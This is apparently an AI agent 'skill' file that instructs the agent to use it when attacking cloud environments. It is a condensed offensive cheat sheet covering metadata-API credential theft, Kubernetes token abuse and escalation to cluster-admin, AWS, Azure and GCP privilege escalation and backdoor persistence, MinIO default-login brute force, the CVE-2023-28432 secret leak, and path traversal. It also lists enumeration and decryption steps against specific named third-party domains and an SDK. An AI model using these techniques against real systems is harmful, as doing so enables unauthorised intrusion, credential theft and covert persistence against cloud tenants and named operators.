---
name: cloud-attack-methods
description: >-
  Cloud attacks: metadata API, S3/K8s, AWS/Azure/GCP identity privilege escalation, MinIO matrix, Aliyun FC, ChengZi SDK decryption. Use when attacking cloud metadata, IAM, K8s, MinIO, Aliyun FC, or cloud post-ex.
metadata:
  tags: [pentest, penetration-testing, red-team]
---

## Cloud Attack Techniques

```
=== Cloud ===
Metadata API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | Aliyun 100.100.100.200
Object storage: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1 to get secrets/exec pods → cluster-admin
🚨 Cloud identity attacks (privilege escalation/lateral movement after obtaining a key/token):
  AWS: enumerate-iam/cloudfox/ScoutSuite to enumerate permissions → pacu to automatically find privesc (iam:PassRole+lambda/ec2/glue and 18+ others) | STS AssumeRole cross-account | steal keys from Lambda environment variables
  Azure/Entra: roadtools (roadrecon dumps the tenant)/AADInternals | device code/refresh token | Managed Identity IMDS to steal a token | Automation Runbook RCE | Key Vault to read secrets
  Entra post-exploitation: GraphRunner (Graph API enumeration/search mail/add backdoor App) | add credentials to a service principal (covert persistence) | dynamic-group abuse | steal the PRT for lateral movement
  GCP: service-account token (metadata) | serviceAccountTokenCreator/actAs privilege escalation | gcloud enumeration
🚨 K8s deep dive (having gained cluster network/pod access): kubelet 10250 unauthorized (/pods to list, /exec into any container) | etcd 2379 unauthenticated to read all secrets | API Server anonymous | RBAC over-privileged SA (kubectl auth can-i --list) | privileged pod mounting the host to escape | cloud K8s to grab the node identity → IMDS
🚨 MinIO attack matrix:
  Fingerprint: Server: MinIO | /minio/health/live → 200 (empty body) | /minio/health/cluster → 200 | 9000 (API) + 9001 (Console)
  Console brute-force: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403="invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → requires JWT provider configuration
  CVE-2023-28432: POST /minio/health/cluster?verify (information disclosure, returns environment variables including MINIO_SECRET_KEY)
  CVE-2023-28434: path traversal /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName (unavailable if patched)
  Anonymous access: GET /bucket-name/ → ListBucket (200) = anonymous read | PUT /bucket/file → AccessDenied (403) = anonymous write disabled
  Upload bypass: the application layer's sign validates the dir parameter but does not check it → can write to any bucket (the sign only validates cid+et+og, not dir)
  Extension bypass: .jsp;.jpg / .jsp%00.jpg passes the application blacklist, but MinIO stores it as a static file (image/jpeg) and does not execute it
🚨 Aliyun FC function (fcapp.run) enumeration:
  Identification: URL contains *.cn-{region}.fcapp.run → Aliyun Function Compute (Serverless)
  Characteristics: POST returns "unauthorized method 'POST'" (405) = only GET is accepted | 200 + {"code":200,"msg":"Forbidden"} = the path exists but a parameter is missing
  Exploit: GET /{path}/{id}.html → 302 redirect leaks the real CDN domain + auth_key signed URL (exposes the CDN domain/bucket structure/signing algorithm)
  Enumeration: different path prefixes correspond to different APPs (/mkzavakx/ vs /kpqwbcoq/) | an invalid ID → 302 to qzone.qq.com/404.html (fallback)
  Path traversal: FC normalizes correctly (../ ineffective), but you can enumerate different function paths
  CDN auth_key (Kunlun CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → cracking requires the privatekey | x-tengine-error exposes "denied by req auth"
  FC→CDN path: the FC function generates a signed URL → download via kunlun/kijwsks.com CDN | spoof the referer as Baidu (mo.baidu.com)
🚨 ChengZi site-builder (ChengZi SDK) decryption:
  Initialization: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → encrypted response (base64)
  Decryption: single-byte XOR key=0x96 → JSON (channelCode/fu download URL/csu tracking URL/ph installer hash)
  d3504.cn goes through Cloudflare + Aliyun DDoS protection (aliyunddos) + Kunlun CDN (kunlunaq.com) → multi-layer protection
  Key: the fu field = the real APK-download FC-function URL (may be in a different region from the landing page!) | csu = click-tracking callback URL
```
